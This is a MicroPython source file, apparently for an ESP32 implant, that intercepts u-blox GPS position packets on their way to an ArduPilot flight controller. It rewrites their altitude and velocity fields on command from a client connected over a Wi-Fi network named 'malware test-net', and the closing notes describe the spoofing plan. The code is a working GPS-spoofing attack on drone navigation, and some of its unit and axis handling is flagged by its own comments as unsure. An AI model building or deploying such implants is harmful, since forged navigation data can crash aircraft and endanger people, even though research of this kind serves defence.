import network
import socket
from machine import UART
from pyubx2 import UBXReader, UBXMessage, SET
from binascii import hexlify
import _thread
import ujson
import geo
import utime


# DISABLE_NAV_SOL = b'\xb5b\x06\x01\x08\x00\x01\x06\x00\x00\x00\x00\x00\x00\x16\xd5'  # <UBX(CFG-MSG, msgClass=NAV, msgID=NAV-SOL, rateDDC=0, rateUART1=0, rateUART2=0, rateUSB=0, rateSPI=0, reserved=0)>
DISABLE_NAV_SOL = b'\xb5b\x06\x01\x08\x00\x01\x06\x00\x00\x00\x00\x00\x00\x16\xd5'  # For some reason, laptop generates different bytes than esp32
# UBXMessage('CFG', 'CFG-MSG', SET, msgClass=1, msgID=6, rate=0)
PAYLOAD_OFFSET = 6
LAT_REF = 42.339513
LONG_REF = -71.085144
H_REF = 0

def disable_nav_sol(uart_gps):
    reader = UBXReader(uart_gps)
    while True:
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)

        idx = 0
        limit = 5
        for (_, parsed_data) in reader:
            print(parsed_data)
            if idx >= limit:
                break
            if parsed_data.identity == 'ACK-ACK':
                # TODO Let some more come thru to clear out for later hardcoded stuff
                return
            else:
                idx += 1


def modify_pvt_pkt(pkt, transform, current_lla):

    # Save current lat, long, h_msl to current_lla
    cur_lat = int.from_bytes(pkt[PAYLOAD_OFFSET + 28: PAYLOAD_OFFSET + 32], 'little', True)
    cur_long = int.from_bytes(pkt[PAYLOAD_OFFSET + 24: PAYLOAD_OFFSET + 28], 'little', True)
    cur_h_msl = int.from_bytes(pkt[PAYLOAD_OFFSET + 36: PAYLOAD_OFFSET + 40], 'little', True)

    current_lla.lock.acquire()
    current_lla.lat = cur_lat
    current_lla.long = cur_long
    current_lla.h_msl = cur_h_msl
    current_lla.lock.release()

    print("Year: " + str(int.from_bytes(pkt[PAYLOAD_OFFSET + 4: PAYLOAD_OFFSET + 6], 'little', False)))
    print("hMSL: " + str(int.from_bytes(pkt[PAYLOAD_OFFSET + 36: PAYLOAD_OFFSET + 40], 'little', True)))

    # Apply transform to current GPS packets

    transform.lock.acquire()

    if transform.h_msl_diff is not None:
        # Get time elapsed and check if transform is expired. If so, clear transform so we stop using it.
        secs_elapsed = utime.time() - transform.start_time

        if secs_elapsed > transform.timeframe:
            print("Transform expired")
            transform.clear()
            transform.lock.release()
            return pkt


        # Replace GPS hMSL with: starting_h_msl + altitude_velocity * time_elapsed
        existing_h_msl = int.from_bytes(pkt[PAYLOAD_OFFSET + 36: PAYLOAD_OFFSET + 40], 'little', True)
        new_h_msl = existing_h_msl + transform.altitude_velocity * secs_elapsed
        pkt[PAYLOAD_OFFSET + 36: PAYLOAD_OFFSET + 40] = new_h_msl.to_bytes(4, 'little', True)

        print("Existing hMSL: " + str(existing_h_msl))
        print("New hMSL: " + str(new_h_msl))


        # Replace GPS NED velocities with: previously calculated NED velocities
        existing_gps_n = int.from_bytes(pkt[PAYLOAD_OFFSET + 48: PAYLOAD_OFFSET + 52], 'little', True)
        existing_gps_e = int.from_bytes(pkt[PAYLOAD_OFFSET + 52: PAYLOAD_OFFSET + 56], 'little', True)
        existing_gps_d = int.from_bytes(pkt[PAYLOAD_OFFSET + 56: PAYLOAD_OFFSET + 60], 'little', True)
        
        print("Existing GPS North: " + str(existing_gps_n))
        print("Existing GPS East: " + str(existing_gps_e))
        print("Existing GPS Down: " + str(existing_gps_d))

        pkt[PAYLOAD_OFFSET + 48: PAYLOAD_OFFSET + 52] = transform.v_ned_north.to_bytes(4, 'little', True)
        pkt[PAYLOAD_OFFSET + 52: PAYLOAD_OFFSET + 56] = transform.v_ned_east.to_bytes(4, 'little', True)
        pkt[PAYLOAD_OFFSET + 56: PAYLOAD_OFFSET + 60] = transform.v_ned_down.to_bytes(4, 'little', True)
        
        print("New GPS North: " + str(transform.v_ned_north))
        print("New GPS East: " + str(transform.v_ned_east))
        print("New GPS Down: " + str(transform.v_ned_down))

    transform.lock.release()

    ck_a, ck_b = checksum(pkt[2:-2])
    pkt[-2:-1] = ck_a.to_bytes(1, 'big', False)
    pkt[-1:] = ck_b.to_bytes(1, 'big', False)

    return pkt


def checksum(content) -> bytes:  # Stolen from pyubx2
    """
    Calculate checksum using 8-bit Fletcher's algorithm.

    :param bytes content: message content, excluding header and checksum bytes
    :return: checksum
    :rtype: bytes

    """

    check_a = 0
    check_b = 0

    for char in content:
        check_a += char
        check_a &= 0xFF
        check_b += check_a
        check_b &= 0xFF

    return bytes((check_a, check_b))


def recv_gps_pkt(uart_gps):
    data_received = bytearray()

    header = uart_gps.read(2)
    # print("Header: " + str(hexlify(header)))
    if int.from_bytes(header, "big") != 0xb562:
        raise Exception("Header not right, is " + str(header))  # TODO this breaks sometimes
    data_received.extend(header)
    msg_class = uart_gps.read(1)
    # print("Class: " + str(hexlify(msg_class)))
    data_received.extend(msg_class)
    msg_id = uart_gps.read(1)
    # print("ID: " + str(hexlify(msg_id)))
    data_received.extend(msg_id)
    length = uart_gps.read(2)
    data_received.extend(length)
    length = int.from_bytes(length, "little")
    # print("Length: " + str(length))
    payload = uart_gps.read(length)
    data_received.extend(payload)
    checksum = uart_gps.read(2)
    data_received.extend(checksum)
    return data_received


def send_uart(uart_if, raw_data):
    num_written = 0
    while num_written < len(raw_data):
        num_recv = uart_if.write(raw_data[num_written:])
        num_written += num_recv


def worker_thread(transform, current_lla):
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.bind(('10.10.10.1', 8080))
    listen_sock.listen(1)

    while True:
        print("Waiting on connection")
        conn_sock, _ = listen_sock.accept()
        print("Accepted socket")
        
        while True:
            pkt = recv_transform_msg(conn_sock)
            if pkt is None:
                conn_sock.close()
                # Zero out transformations
                transform.lock.acquire()
                transform.clear()
                print("Cleared transform")
                transform.lock.release()
                break

            changes = ujson.loads(pkt.decode('utf-8'))

            if changes.get("h_msl_diff") is not None and changes.get("timeframe") is not None:
                # Get diff and timeframe
                h_msl_diff = int(changes['h_msl_diff'])
                timeframe = int(changes['timeframe'])

                # Using current Lat/Long/Alt (LLA), calculate end LLA and corresponding start, end NED coordinates, and required altitude velocity.
                current_lla.lock.acquire()
                cur_lat = current_lla.lat
                cur_long = current_lla.long
                cur_h_msl = current_lla.h_msl
                current_lla.lock.release()

                end_h_msl = cur_h_msl + h_msl_diff

                # Geo uses height in METERS not MM
                start_enu_east, start_enu_north, start_enu_up = geo.geodetic_to_enu(cur_lat, cur_long, cur_h_msl / 1000, LAT_REF, LONG_REF, H_REF) # TODO FIX
                end_enu_east, end_enu_north, end_enu_up = geo.geodetic_to_enu(cur_lat, cur_long, end_h_msl / 1000, LAT_REF, LONG_REF, H_REF) # TODO FIX

                # Note NED vs. ENU -- just invert Up velocity to get Down velocity
                # Use S=D/T on start and end NED coordinates to calculate new NED velocities
                # ^^ WILL LIKELY BE IN METERS/SEC NOT MM/SEC
                v_enu_east = int(((end_enu_east - start_enu_east) / timeframe) * 1000)
                v_enu_north = int(((end_enu_north - start_enu_north) / timeframe) * 1000)
                v_enu_up = int(((end_enu_up - start_enu_up) / timeframe) * 1000)

                # Alt velocity
                altitude_velocity = int(h_msl_diff / timeframe)

                # Start time
                start_time = utime.time()

                # Set values in transform object (lock!)
                transform.lock.acquire()
                transform.h_msl_diff = h_msl_diff
                transform.starting_h_msl = cur_h_msl
                transform.altitude_velocity = altitude_velocity
                transform.v_ned_north = v_enu_east  # Think you're supposed to swap these https://core.ac.uk/download/pdf/5164477.pdf
                transform.v_ned_east = v_enu_north
                transform.v_ned_down = v_enu_up * -1
                transform.start_time = start_time
                transform.timeframe = timeframe
                transform.lock.release()

                print("h_msl_diff: " + str(transform.h_msl_diff))
            

def recv_transform_msg(conn):
    """
    Return message from laptop
    """

    received = bytearray()
    while len(received) < 2:
        try:
            data = conn.recv(2-len(received))
            received.extend(data)
        except Exception as err:
            raise err
            print(err)
            print("Socket error")
            return None
        if len(data) == 0:
            print("Socket closed")
            return None

    length = int.from_bytes(received, 'big', False)

    received = bytearray()
    while len(received) < length:
        try:
            data = conn.recv(length-len(received))
            received.extend(data)
        except Exception as err:
            print(err)
            print("Socket error")
            return None
        if len(data) == 0:
            print("Socket closed")
            return None
    return bytes(received)


def main():
    utime.sleep(2)  # Give time for GPS to boot

    ap = network.WLAN(network.AP_IF)
    ap.ifconfig(('10.10.10.1', '255.255.255.0', '10.10.10.1', '8.8.8.8'))
    ap.config(essid='malware test-net', channel=6)
    ap.config(hidden=False)
    ap.active(False)
    ap.active(True)

    uart_gps = UART(1, 115200)  # Reading from GPS
    uart_gps.init(115200, bits=8, parity=None, stop=1, rx=18, tx=23, timeout=5000, timeout_char=5000)  # 5000ms = 5s, should be find since UBlox sends like 5 times/sec

    uart_ardupilot = UART(2, 115200)  # Writing to board
    uart_ardupilot.init(115200, bits=8, parity=None, stop=1)

    disable_nav_sol(uart_gps)

    transform = Transform()
    current_lla = CurrentLLA()

    _thread.start_new_thread(worker_thread, (transform, current_lla))

    num=0
    while True:
        print(num)

        gps_ubx_pkt = recv_gps_pkt(uart_gps)

        if not (gps_ubx_pkt[2] == 1 and gps_ubx_pkt[3] == 7):
            print("Not PVT")
            continue  # Not PVT

        modified_pvt_pkt = modify_pvt_pkt(gps_ubx_pkt, transform, current_lla)
        send_uart(uart_ardupilot, modified_pvt_pkt)

        num+=1


class Transform():
    def __init__(self):
        self.lock = _thread.allocate_lock()
        self.h_msl_diff = None  # mm
        self.starting_h_msl = None  # mm
        self.altitude_velocity = None # mm/sec
        self.v_ned_north = None  # mm/sec
        self.v_ned_east = None  # mm/sec
        self.v_ned_down = None  # mm/sec
        self.start_time = None  # sec since epoch
        self.timeframe = None  # Seconds

    def clear(self):
        self.h_msl_diff = None
        self.starting_h_msl = None
        self.altitude_velocity = None
        self.v_ned_north = None
        self.v_ned_east = None
        self.v_ned_down = None
        self.start_time = None
        self.timeframe = None


class CurrentLLA():
    def __init__(self):
        self.lock = _thread.allocate_lock()
        self.lat = None
        self.long = None
        self.h_msl = None  # mm


if __name__ == "__main__":
    main()



"""

Program:
- Main thread
    - Init UART interfaces
    - Init network
    - Start worker thread
    - Read PVT
    - Apply any necessary modifications (with mutex) -- add/subtract stored modifications
    - Serialize PVT -- not necessary, just do modifications inline
    - Send to Board
- Worker thread
    - Start socket thread, wait for connection
    - Block until command received
    - Interpret command
    - Save command (with mutex)


Take incoming altitude adjustment and timeframe from client
    Using current Lat/Long/Alt (LLA), calculate end LLA and corresponding start, end NED coordinates, and required altitude velocity.
    Use S=D/T on start and end NED coordinates to calculate new NED velocities
    Save starting_h_msl, altitude_velocity, start_time, timeframe

On incoming GPS message (before time has expired):
    Get time_elapsed since transform was received from client
    Replace GPS hMSL with: starting_h_msl + altitude_velocity * time_elapsed
    Replace GPS NED velocities with: previously calculated NED velocities

On incoming GPS message (after time has expired) to hold drone at new position:
    Keep replacing but stop replacing NED velocities.

    # TODO speed accuracy?


"""









"""
Take incoming altitude adjustment and timeframe from client
    Using current Lat/Long/Alt (LLA), calculate end LLA and corresponding start, end NED coordinates, and required altitude velocity.
    Use S=D/T on start and end NED coordinates to calculate new NED velocities
    Note starting_h_msl, altitude_velocity, NED velocities, start_time, end_time

On incoming GPS message (before time has expired):
    Get time_elapsed since transform was received from client
    Replace GPS hMSL with calculated height: starting_h_msl + altitude_velocity * time_elapsed
    Replace GPS NED with previously calculated NED speed

On incoming GPS message (after time has expired):
    Keep new height constant but stop replacing NED velocities.
"""